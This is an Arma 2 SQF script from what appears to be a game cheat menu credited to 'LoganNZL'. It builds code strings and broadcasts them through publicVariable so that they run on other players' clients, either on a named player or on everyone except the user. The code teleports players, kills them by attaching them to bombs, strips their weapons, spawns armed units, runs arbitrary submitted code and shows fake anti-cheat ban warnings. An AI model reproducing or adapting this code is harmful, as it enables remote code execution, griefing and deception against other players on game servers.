//Thanks for checking out my edit. Thanks to: Veteran, LoganNZL, Infistar, Malory, Rustler, Some people off Youtube for sending me some awesome scripts. And anyone else I forgot!
//////////////////////////////////////////////////////////////////////
//          __    Happy New Year!         _   _______   __ 			//
//   	   / /   ____  ____ _____ _____  / | / /__  /  / / 			//
//  	  / /   / __ \/ __ `/ __ `/ __ \/  |/ /  / /  / /  			//
// 		 / /___/ /_/ / /_/ / /_/ / / / / /|  /  / /__/ /___			//
//		/_____/\____/\__, /\__,_/_/ /_/_/ |_/  /____/_____/			//
//            		/____/        www.youtube.com/LoganNZL          //
//////////////////////////////////////////////////////////////////////

TTT5NamePl = _this select 0;		// Player Name
TTT5OptionNR = _this select 1;	// Option Number
TTT5Exec = _this select 2;		// Option code to execute

// -- Options Numbers List -- //
// Index 0 = Teleport
// Index 1 = Kill
// Index 2 = Disable Input
// Index 3 = Fly High
// Index 4 = Chat Say
// Index 5 = Code Execute
// Index 6 = Animations

switch (TTT5OptionNR) do
{
	case 0:		// PlayMusic
	{
		//htelepos = The target teleport position
		TTT5NamePl = teleTarget;
		publicVariable "htelepos";	
		sleep 0.1;
		TTT5derCode = "(vehicle player) setpos [htelepos select 0, htelepos select 1, 0];";
	};
	case 1:		// Terrain
	{
		TTT5derCode = format ["setTerrainGrid %1", TTT5Exec];
	};
	case 2:		// ViewDistance
	{
		TTT5derCode = format ["setViewDistance %1", TTT5Exec];
	};
	case 3:		// Fog
	{
		TTT5derCode = format ["setFog %1", TTT5Exec];
	};
	case 4:		// Time
	{
		TTT5derCode = format ["setDate %1", TTT5Exec];
	};
    case 5:		// Weather
	{
		TTT5derCode = format ["3 setovercast %1", TTT5Exec];
	};
	case 6:		// Time
	{
		TTT5derCode = TTT5Exec;
	};
	case 7:		// Time
	{
		TTT5derCode = "serverCommand ""#kick %1""";
	};
	case 8:		// Time
	{
		TTT5derCode = format ["5 setRain %1", TTT5Exec];
	};
	case 9:		// Time
	{
		TTT5derCode = format ["vehicle player sidechat ""%1""", TTT5Exec];
	};
	case 10:		// PlayMusic
	{
		TTT5derCode = format ["player playMove %1", """" + TTT5Exec + """" + ";"];
	};
	case 11:		// PlayMusic
	{
		TTT5derCode = TTT5Exec;
	};
	case 12:		// Teleport
	{
	TTT5derCode = format ["playMusic %1", """" + TTT5Exec + """" + ";"];	
	};
	case 13:		// Teleport
	{
	TTT5derCode = "vehicle player addaction [""CMD Menu (Infectable Menu Test)"", ""LoganNZL\LoganNZL@cmd.sqf"" , ""0""];"; //REMINDER: add this shit if you need help formatting Logan: vehicle player addaction [""IamGay"", ""Soundpack\Dick.sqs"" , ""0""];
	};
case 14:		// Teleport
    {  //hello	
	};
case 15:		// PlayMusic
	{
	TTT5derCode = format ["playSound %1", """" + TTT5Exec + """" + ";"];
	};
	case 16:		// PlayMusic
	{
	TTT5derCode = "LoganBombzor = createVehicle [TTT5Exec,[(getPos player) select 0,(getPos player) select 1,30], [], 0, ""FLY""];Player moveInDriver LoganBombzor;";
	};
	case 17:		// Attach Player to Bomb :) -Logan
	{
	TTT5derCode = "bomb = ""Chukar"" createVehicleLocal position player;player attachTo [bomb,[0,0,0]];bomb setPos [(getPos player) select 0,(getPos player) select 1,1600];";
	};
	case 18:		// PlayMusic
	{
	TTT5derCode = "resistance setFriend [west, 0]; resistance setFriend [east, 0];
               west setFriend [resistance, 0]; east setFriend [resistance, 0];
               c_ch34tsDevString_enter = createCenter resistance;
               TTT5_Str_team = createGroup resistance;
               ""GUE_Soldier_Pilot"" createunit [position player, TTT5_Str_team,""TTT5_Str_unit=this"",  1.0, ""COLONEL""];TTT5_Str_unit addmagazine ""1350Rnd_30mmAP_A10"";TTT5_Str_unit addmagazine ""1350Rnd_30mmAP_A10"";TTT5_Str_unit addmagazine ""1350Rnd_30mmAP_A10""; TTT5_Str_unit addweapon ""GAU8"";TTT5_Str_unit setSkill 1;";
	};
	case 19:		// PlayMusic
	{
	TTT5derCode = "player removeAllEventHandlers ""hit"";player removeAllEventHandlers ""dammaged"";(vehicle player) removeAllEventHandlers ""hit"";(vehicle player) removeAllEventHandlers ""dammaged"";player removeAllEventHandlers ""handleDamage"";";
	};
	case 20:		// PlayMusic
	{
	TTT5derCode = "[this] exec ""onPlayerRespawnAsSeagull.sqs""";
	};
	case 21:		// PlayMusic
	{
	TTT5derCode = "[this] exec ""startup.sqs""";
	};
	case 22:		// PlayMusic
	{
	TTT5derCode = "removeAllWeapons player;";
	};
	case 23:		// PlayMusic
	{
	TTT5derCode = "ALexstrng_center = createCenter west;
TTT5_Str_team = createGroup west;
TTT5Exec createunit [position player, TTT5_Str_team,""TTT5_Str_unit=this"",  1.0, ""COLONEL""];
addSwitchableUnit TTT5_Str_unit;
selectPlayer TTT5_Str_unit;";
	};
	case 24:		// PlayMusic
	{
	TTT5derCode = format ["player setFace %1", """" + TTT5Exec + """" + ";"];
	};
	case 25:		// PlayMusic
	{
	TTT5derCode = "hint ""LoganNZL's Script Menu, get it at: www.youtube.com/LoganNZL"";";
	};
	case 26:		// PlayMusic
	{
	TTT5derCode = "hint ""Warning! Our anti-cheat has detected that you're walking too fast. If this is an error please visit the forum and post a ticket for your GUID to be unbanned."";"; //Lol, had to add this -Logan
	};
	case 27:		// PlayMusic
	{		
	TTT5derCode = "hint ""Warning! Our anti-cheat has detected that you're using a modded/hacked weapon. If this is an error please visit the forum and post a ticket for your GUID to be unbanned."";";
	};
	
};


switch (TTT5NamePl) do {
	case "":
	{
	hijExecString = TTT5derCode;
	};
	case "Everyone Except You":
	{
	hijExecString = format["if((getPlayerUID player) != '%1') then{ _xcompiled = compile TTT5derCode;call _xcompiled; }", (getPlayerUID player)];
	};
	default {
	hijExecString = "if (name vehicle player == TTT5NamePl) then {_xcompiled = compile TTT5derCode;call _xcompiled;};";
	};
};
publicVariable "TTT5NamePl";
sleep 0.1;
publicVariable "TTT5derCode";
sleep 0.1;
publicVariable "TTT5Exec";
sleep 0.1;

nil = [hijExecString] execVM "LoganNZL\LoganNZL@scripts\Lmain3.sqf";

hint format["LoganNZL Executed on %1",TTT5NamePl];